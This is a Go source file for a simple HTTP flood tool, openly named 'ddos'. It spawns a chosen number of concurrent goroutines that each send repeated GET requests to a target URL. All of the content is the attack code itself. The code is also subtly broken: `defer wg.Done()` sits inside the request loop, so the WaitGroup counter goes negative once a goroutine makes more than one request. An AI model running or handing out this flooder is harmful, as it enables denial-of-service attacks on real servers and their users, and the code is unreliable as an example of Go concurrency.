package main

import (
	"fmt"
	"log"
	"net/http"
	"sync"
)

func ddos(url string, countConcurrent int, countRequest int) {
	var wg sync.WaitGroup
	wg.Add(countConcurrent)
	fmt.Println("------------ Starting DDOS ---------- url : ", url, " ", "Concurrents : ", countConcurrent, " ", "Requests : ", countRequest)
	for i := 1; i <= countConcurrent; i++ {
		go ManyCallHttpRequest(&wg, url, countRequest)
		fmt.Println("count : ", i, " ", "Open Concurrent Process", " ", "url/host : ", url)
	}
	wg.Wait()
}

func ManyCallHttpRequest(wg *sync.WaitGroup, url string, countRequest int) {
	for i := 1; i <= countRequest; i++ {
		_, err := http.Get(url)
		if err != nil {
			log.Fatalln(err)
		}
		defer wg.Done()
	}
}
